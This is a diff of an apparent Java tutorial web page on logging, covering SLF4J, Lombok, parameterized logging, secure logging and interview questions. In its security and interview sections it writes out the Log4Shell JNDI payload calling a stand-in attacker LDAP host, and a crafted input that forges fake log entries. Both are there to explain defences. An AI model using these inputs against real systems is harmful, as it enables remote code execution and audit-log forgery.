-        &lt;RollingRandomAccessFile name="File"
-                                  fileName="logs/app.log"
-                                  filePattern="logs/app-%d{yyyy-MM-dd}-%i.log.gz"&gt;
-            &lt;PatternLayout&gt;
-                &lt;Pattern&gt;%d %p %c{1.} [%t] %m%n&lt;/Pattern&gt;
-            &lt;/PatternLayout&gt;
-            &lt;Policies&gt;
-                &lt;TimeBasedTriggeringPolicy/&gt;
-                &lt;SizeBasedTriggeringPolicy size="100 MB"/&gt;
-            &lt;/Policies&gt;
-        &lt;/RollingRandomAccessFile&gt;
     &lt;/Appenders&gt;
-
     &lt;Loggers&gt;
-        &lt;AsyncLogger name="com.example" level="debug"/&gt;
+        &lt;AsyncLogger name="com.shop" level="debug"/&gt;
         &lt;Root level="info"&gt;
             &lt;AppenderRef ref="Console"/&gt;
-            &lt;AppenderRef ref="File"/&gt;
         &lt;/Root&gt;
     &lt;/Loggers&gt;
 &lt;/Configuration&gt;</code></pre>
-        </section>
+            </section>
 
-        <section class="content-section">
-            <h2>Lombok @Slf4j</h2>
-            <p>Lombok can automatically generate the logger field, reducing boilerplate.</p>
-
-            <pre><code><span class="keyword">import</span> lombok.extern.slf4j.Slf4j;
+            <!-- ═══════════════════════════════════════════
+                 SECTION 8 — LOMBOK @SLF4J
+            ════════════════════════════════════════════ -->
+            <section class="content-section">
+                <h2>Lombok <code>@Slf4j</code></h2>
+                <pre><code><span class="keyword">import</span> lombok.extern.slf4j.Slf4j;
 
 <span class="annotation">@Slf4j</span>
-<span class="keyword">public class</span> <span class="class-name">UserService</span> {
+<span class="keyword">public class</span> <span class="class-name">CustomerService</span> {
+    <span class="comment">// Lombok generates: private static final Logger log = LoggerFactory.getLogger(CustomerService.class);</span>
 
-    <span class="comment">// No need to declare logger manually!</span>
-    <span class="comment">// Lombok generates: private static final Logger log = LoggerFactory.getLogger(UserService.class);</span>
-
-    <span class="keyword">public</span> <span class="class-name">User</span> <span class="function">findUser</span>(<span class="class-name">Long</span> id) {
-        log.info(<span class="string">"Finding user: {}"</span>, id);
+    <span class="keyword">public</span> <span class="class-name">Customer</span> <span class="function">findCustomer</span>(<span class="class-name">Long</span> id) {
+        log.info(<span class="string">"Finding customer: {}"</span>, id);
         <span class="comment">// ...</span>
     }
-}
-
-<span class="comment">// Other Lombok logging annotations:</span>
-<span class="annotation">@Log</span>           <span class="comment">// java.util.logging</span>
-<span class="annotation">@Log4j2</span>        <span class="comment">// Log4j 2</span>
-<span class="annotation">@Slf4j</span>         <span class="comment">// SLF4J (recommended)</span>
-<span class="annotation">@CommonsLog</span>    <span class="comment">// Apache Commons Logging</span></code></pre>
-        </section>
-
-        <section class="content-section">
-            <h2>Security Considerations</h2>
-
-            <div class="info-box warning">
-                <div class="info-box-title">Never Log Sensitive Data</div>
-                <ul>
-                    <li>Passwords and credentials</li>
-                    <li>Credit card numbers</li>
-                    <li>Social security numbers</li>
-                    <li>API keys and tokens</li>
-                    <li>Personal health information</li>
-                </ul>
-            </div>
-
-            <pre><code><span class="comment">// BAD - Logging sensitive data</span>
-logger.info(<span class="string">"User login: {} with password: {}"</span>, username, password);
-logger.debug(<span class="string">"Payment with card: {}"</span>, creditCardNumber);
-
-<span class="comment">// GOOD - Mask or omit sensitive data</span>
-logger.info(<span class="string">"User login attempt: {}"</span>, username);
-logger.debug(<span class="string">"Payment processed for card ending in: {}"</span>,
-             maskCardNumber(creditCardNumber));
-
-<span class="keyword">private</span> <span class="class-name">String</span> <span class="function">maskCardNumber</span>(<span class="class-name">String</span> cardNumber) {
-    <span class="keyword">if</span> (cardNumber == <span class="keyword">null</span> || cardNumber.length() &lt; <span class="number">4</span>) {
-        <span class="keyword">return</span> <span class="string">"****"</span>;
-    }
-    <span class="keyword">return</span> <span class="string">"****-****-****-"</span> + cardNumber.substring(cardNumber.length() - <span class="number">4</span>);
 }</code></pre>
-        </section>
+            </section>
 
-        <section class="related-topics">
-            <h3>Related Topics</h3>
-            <div class="related-links">
-                <a href="testing.html" class="related-link">Testing (JUnit, Mockito)</a>
-                <a href="code-quality.html" class="related-link">Code Quality Tools</a>
-                <a href="../best-practices/error-handling-patterns.html" class="related-link">Error Handling Patterns</a>
-                <a href="../spring/boot.html" class="related-link">Spring Boot</a>
-            </div>
-        </section>
-    </main>
+            <!-- ═══════════════════════════════════════════
+                 SECTION 9 — LOGGING BEST PRACTICES
+            ════════════════════════════════════════════ -->
+            <section class="content-section">
+                <h2>Parameterized Logging and Exception Logging</h2>
+
+                <pre><code><span class="comment">// BAD — string concatenation always builds the message, even when DEBUG is disabled</span>
+log.debug(<span class="string">"Processing customer: "</span> + customer.getName());
+
+<span class="comment">// GOOD — parameterized, the message is only built if the level is enabled</span>
+log.debug(<span class="string">"Processing customer: {}"</span>, customer.getName());
+
+<span class="comment">// For genuinely expensive-to-build arguments, guard explicitly</span>
+<span class="keyword">if</span> (log.isDebugEnabled()) {
+    log.debug(<span class="string">"Order details: {}"</span>, order.toDetailedString());
+}</code></pre>
+
+                <pre><code><span class="comment">// BAD — loses the stack trace entirely</span>
+log.error(<span class="string">"Error: "</span> + e.getMessage());
+
+<span class="comment">// GOOD — context plus the full stack trace as the last argument</span>
+log.error(<span class="string">"Failed to process order {}"</span>, orderId, e);</code></pre>
+            </section>
+
+            <!-- ═══════════════════════════════════════════
+                 SECTION 10 — SECURITY CONSIDERATIONS
+            ════════════════════════════════════════════ -->
+            <section class="content-section">
+                <h2>Security Considerations</h2>
+
+                <div class="info-box warning">
+                    <div class="info-box-title">Never log sensitive data</div>
+                    <ul>
+                        <li>Passwords and raw credentials</li>
+                        <li>Full credit card numbers</li>
+                        <li>API keys, tokens, session identifiers</li>
+                    </ul>
+                </div>
+
+                <pre><code><span class="comment">// BAD</span>
+log.info(<span class="string">"Customer login: {} with password: {}"</span>, email, password);
+
+<span class="comment">// GOOD — mask or omit entirely</span>
+log.info(<span class="string">"Customer login attempt: {}"</span>, email);
+log.debug(<span class="string">"Payment processed for card ending in: {}"</span>, maskCardNumber(cardNumber));</code></pre>
+
+                <h3>Log injection — the vulnerability specific to logging itself</h3>
+                <p>Beyond what you deliberately choose to log, unsanitized user
+                    input written into a log line can forge fake entries. If a
+                    customer's display name contains a newline followed by text
+                    crafted to look like a legitimate log line, a naive log viewer
+                    (or a human scanning raw text) can be tricked into reading a
+                    fabricated entry as if the application produced it.</p>
+
+                <pre><code><span class="comment">// A customer sets their name to:
+// "Karlete\n2026-07-10 03:15:00 INFO  AuthService - Admin login successful"</span>
+
+log.info(<span class="string">"Order placed by {}"</span>, customerName);
+<span class="comment">// Plain-text output now contains a second, fabricated "log line" that
+// never actually happened — indistinguishable from a real one to anyone
+// scanning the raw file.</span></code></pre>
+
+                <div class="info-box tip">
+                    <div class="info-box-title">Structured logging (Section 5) closes this gap by construction</div>
+                    <p>With a JSON encoder, user-supplied content is placed inside
+                        a properly escaped JSON string value — a newline becomes
+                        the two characters <code>\n</code> inside that field, not
+                        an actual line break in the output stream. This is one more
+                        concrete reason structured logging is the right default
+                        rather than a nice-to-have: it isn't just easier to query,
+                        it removes an entire class of log-forging attack that plain
+                        text is inherently vulnerable to.</p>
+                </div>
+            </section>
+
+            <!-- ═══════════════════════════════════════════
+                 SECTION 11 — BEST PRACTICES
+            ════════════════════════════════════════════ -->
+            <section class="content-section">
+                <h2>Best Practices and Common Pitfalls</h2>
+
+                <div class="best-practices">
+                    <h3>✅ Do</h3>
+                    <ul>
+                        <li>Code against the SLF4J API, not a specific implementation directly</li>
+                        <li>Default to structured JSON logging — treat plain text as the exception, not the norm</li>
+                        <li>Log to stdout in containers and let the platform's log collector handle rotation and retention</li>
+                        <li>Propagate a trace ID across every service call so logs can be correlated across a distributed request</li>
+                        <li>Keep logging dependencies patched aggressively — Log4Shell was exploited primarily through transitive dependencies nobody was tracking directly</li>
+                        <li>Use parameterized logging (<code>{}</code> placeholders) so arguments are only evaluated when the level is actually enabled</li>
+                    </ul>
+
+                    <h3>❌ Don't</h3>
+                    <ul>
+                        <li>Don't log passwords, tokens, or full card numbers — mask or omit them entirely</li>
+                        <li>Don't write user-supplied strings directly into plain-text log lines without structured encoding — it's forgeable via log injection</li>
+                        <li>Don't rely on a <code>RollingFileAppender</code> as the default for a service running in an ephemeral container — the file disappears when the pod does</li>
+                        <li>Don't use string concatenation in a log call — it builds the message even when that level is disabled</li>
+                        <li>Don't assume "we're not affected" about a logging CVE without checking transitive dependencies — Log4Shell reached most of its victims through libraries three layers removed from the application's own <code>pom.xml</code></li>
+                    </ul>
+                </div>
+            </section>
+
+            <!-- ═══════════════════════════════════════════
+                 SECTION 12 — INTERVIEW QUESTIONS
+            ════════════════════════════════════════════ -->
+            <section class="content-section">
+                <h2>Interview Questions</h2>
+
+                <div class="info-box note">
+                    <div class="info-box-title">🎓 Junior level</div>
+                    <p><strong>Q: What's the difference between SLF4J and Logback?</strong><br>
+                    SLF4J is a facade — an API your code calls
+                    (<code>Logger</code>, <code>LoggerFactory</code>) without
+                    depending on any specific logging engine. Logback is one
+                    concrete implementation of that facade — the library that
+                    actually formats and writes the log line. Code against SLF4J so
+                    the underlying implementation can be swapped without touching
+                    application code.</p>
+
+                    <p><strong>Q: Why is <code>log.debug("Processing: {}", value)</code> preferred over string concatenation?</strong><br>
+                    With a <code>{}</code> placeholder, the arguments are only
+                    formatted into the final string if that log level is actually
+                    enabled. String concatenation (<code>"Processing: " + value</code>)
+                    builds the full string unconditionally on every call, even when
+                    DEBUG logging is disabled and the result will be thrown away
+                    immediately.</p>
+
+                    <p><strong>Q: Why shouldn't you log a customer's password, even at DEBUG level?</strong><br>
+                    Log files are frequently retained for weeks, shipped to
+                    third-party log aggregation platforms, and accessible to a
+                    wider set of people (support engineers, on-call responders)
+                    than the production database itself. A password written to a
+                    log line persists in plain text across all of those systems
+                    indefinitely, regardless of what log level was used.</p>
+                </div>
+
+                <div class="info-box important">
+                    <div class="info-box-title">🔥 Senior level</div>
+                    <p><strong>Q: Explain the actual mechanism behind Log4Shell (CVE-2021-44228) — not just "it was a JNDI vulnerability," but why logging specifically was the vector.</strong><br>
+                    Log4j 2's message layout engine supported an embedded lookup
+                    syntax, <code>${...}</code>, intended for legitimate uses like
+                    substituting system properties into a log pattern. Crucially,
+                    this substitution was evaluated on the <em>content being
+                    logged</em>, not just on the static pattern configuration — so
+                    if an application logged a string containing
+                    <code>${jndi:ldap://attacker.com/a}</code>, Log4j would
+                    actually perform that JNDI lookup, connect to the attacker's
+                    LDAP server, and load and execute the class it returned. The
+                    vector was any application that logged attacker-influenced
+                    input verbatim — HTTP headers, usernames, search terms — which
+                    describes an enormous fraction of production Java
+                    applications, since logging request metadata is completely
+                    ordinary practice. The fix disabled JNDI lookups and message
+                    lookups by default; the broader lesson is that a logging
+                    library uniquely sits in the direct path of untrusted input on
+                    nearly every request, which makes it a disproportionately
+                    high-value target relative to how little scrutiny it typically
+                    receives compared to, say, the web framework itself.</p>
+
+                    <p><strong>Q: Your team hand-rolls a <code>requestId</code> via MDC for correlating logs. What breaks in a microservices architecture, and how does distributed tracing actually solve it?</strong><br>
+                    A manually generated <code>requestId</code> lives only within
+                    the thread of the service that created it — the moment
+                    <code>order-service</code> calls <code>payment-service</code>
+                    over HTTP, that ID has no mechanism to cross the network
+                    boundary unless every single outgoing call is manually modified
+                    to forward it as a header, and every receiving service is
+                    manually modified to read that header back into its own MDC.
+                    This is brittle and easy to miss on any new integration point.
+                    Distributed tracing solves this structurally: a trace ID is
+                    generated once at the system's edge, and the tracing library
+                    (OpenTelemetry, via Micrometer Tracing in Spring Boot)
+                    instruments the HTTP client and server layers directly, so
+                    propagation across service boundaries happens automatically
+                    for every call using that instrumented client — not as
+                    something each developer has to remember to wire up per
+                    integration. The practical result is that "find every log line
+                    across every service involved in this one customer's failed
+                    checkout" becomes a single trace ID lookup instead of
+                    correlating timestamps across three separate log streams by
+                    hand.</p>
+
+                    <p><strong>Q: A service logs raw user-supplied text to a plain-text file. Explain the log injection risk concretely, and why switching to JSON output isn't just a formatting preference.</strong><br>
+                    If user-controlled input can contain a newline character, and
+                    that input is written directly into a plain-text log line, an
+                    attacker can craft input that, once logged, visually produces
+                    what looks like an entirely separate, fabricated log entry —
+                    for example, one that appears to show a successful admin login
+                    that never occurred. Anyone scanning the raw log file, or any
+                    downstream tool that naively parses log lines by splitting on
+                    newlines, has no way to distinguish the forged entry from a
+                    genuine one; the attacker is effectively writing directly into
+                    your audit trail. Structured JSON output prevents this by
+                    construction rather than by convention: a JSON encoder escapes
+                    a newline inside a string value as the two characters
+                    <code>\n</code>, which stays inside that field's value and
+                    never breaks into a new top-level JSON object. The fix isn't
+                    "remember to sanitize newlines everywhere user input is
+                    logged" — it's using an output format where the structural
+                    boundary between log entries can't be forged by field content
+                    in the first place.</p>
+                </div>
+            </section>
+
+            <!-- RELATED TOPICS -->
+            <section class="related-topics">
+                <h3>Related Topics</h3>
+                <p class="related-intro">Continue your Java journey:</p>
+                <div class="related-links">
+                    <a href="testing.html" class="related-link"><span class="related-icon">🧪</span>Testing (JUnit, Mockito)</a>
+                    <a href="code-quality.html" class="related-link"><span class="related-icon">✅</span>Code Quality Tools</a>
+                    <a href="cicd.html" class="related-link"><span class="related-icon">🔁</span>CI/CD Basics</a>
+                    <a href="../best-practices/error-handling-patterns.html" class="related-link"><span class="related-icon">⚠️</span>Error Handling Patterns</a>
+                </div>
+            </section>
+
+        </main>
+
+    </div><!-- /.topic-layout -->
 
     <footer class="site-footer">
-        <p>&copy; 2026 JavaDev Bible</p>
+        <p data-i18n="footer.copyright">&copy; 2026 JavaDev Bible</p>
     </footer>
 
+    <script src="../../js/i18n.js"></script>
     <script src="../../js/navigation.js"></script>
+    <script src="../../js/toc.js"></script>
 </body>
 </html>
-
